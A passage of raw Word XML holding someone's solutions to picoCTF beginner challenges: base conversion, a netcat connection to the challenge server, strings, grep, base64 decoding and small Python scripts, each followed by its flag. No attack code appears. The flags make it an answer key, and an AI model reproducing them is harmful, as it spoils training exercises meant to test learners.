          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">D=13 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3E904E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>3=32+16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D32E5DE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>13+32+16=61</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A92DD7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>{61}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19509A27" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44368630" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>2Warm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC6A5DE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">Can you convert the number 42 (base 10) to binary (base 2)? </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D62BF6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>{101010}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00614F04" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>what's a net cat?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30210D58" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F09A7FB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">) is going to be pretty important. Can you connect to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>jupiter.challenges.picoctf.org</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> at port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>64287</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to get the flag?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="307E4D8F"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 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> jupiter.challenges.picoctf.org  64287</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="787226B6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>You're on your way to becoming the net cat master</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E44040F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>{nEtCat_Mast3ry_284be8f7}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="225C9BAD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55CD08B9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>strings it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D488FC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3597F4FA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you find the flag in </w:t>
      </w:r>
      <w:hyperlink r:id="rId15" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>file</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> without running it?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="219DF4F6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43CB488D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">:~/Downloads$ strings </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>strings</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> &gt;s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AB1220"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s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E34BB7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{5tRIng5_1T_827aee91}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BDC6925" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51BA9D16" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Bases</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F293D83" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C29D9B3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C91A5D6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A93B552" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">What does this </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>bDNhcm5fdGgzX3IwcDM1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> mean? I think it has something to do with bases.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F9FD592" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Base64 decode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D10028" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{l3arn_th3_r0p35}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69FFC842" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14B281FE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>First Grep</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F31A3F9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6C51DC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8D4CED" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Author: Alex Fulton/Danny </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Tunitis</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="43CCD812" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2489F851" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you find the flag in </w:t>
      </w:r>
      <w:hyperlink r:id="rId16" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>file</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>? This would be really tedious to look through manually, something tells me there is a better way.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0803BB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">:~/Downloads$ grep </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pico</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A8401A3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{grep_is_good_to_find_things_dba08a45}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="753FA8D9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="263D767C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Codebook</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF72B05" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3A2C98" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51CD8B86" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556E7862" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0D263D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Run the Python script </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>code.py</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the same directory as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>codebook.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3580B572" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="707"/>
        </w:tabs>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:hyperlink r:id="rId17" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download code.py</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25BDB49A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="707"/>
        </w:tabs>
      </w:pPr>
      <w:hyperlink r:id="rId18" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download codebook.txt</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C637C8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">:~/Downloads$ python3 code.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4456EA91" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{c0d3b00k_455157_7d102d7a}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5571A0B4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="032F060A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>convertme.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E076FA5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E52E7C2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D91CDA7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8B40C8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52410C93" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Run the Python script and convert the given number from decimal to binary to get the flag. </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download Python script</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="248C4E07" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="359A283A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">:~/Downloads$ python3 convertme.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7606100F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>If 62 is in decimal base, what is it in binary base?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A30B3B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Answer: 111110</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F2B2F8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">That is correct! Here's your flag: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{4ll_y0ur_b4535_762f748e}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C8BA72" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>fixme1.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA585E7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0EA444" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC0AB21" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0971F672" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740824A4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Fix the syntax error in this Python script to print the flag. </w:t>
      </w:r>
      <w:hyperlink r:id="rId20" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download Python script</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="77728E60"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fixme1.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CD012C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">  File "fixme1.py", line 20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B2B80B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    print('That is correct! Here\'s your flag: ' + flag)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4B6DA5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    ^</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABA043F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>IndentationError</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>: unexpected indent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D41AC4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fixme1.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7B970E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">:~/Downloads$ python3 fixme1.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F5EDDCF"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{1nd3nt1ty_cr1515_09ee727a}</w:t>
      </w:r>
    </w:p>
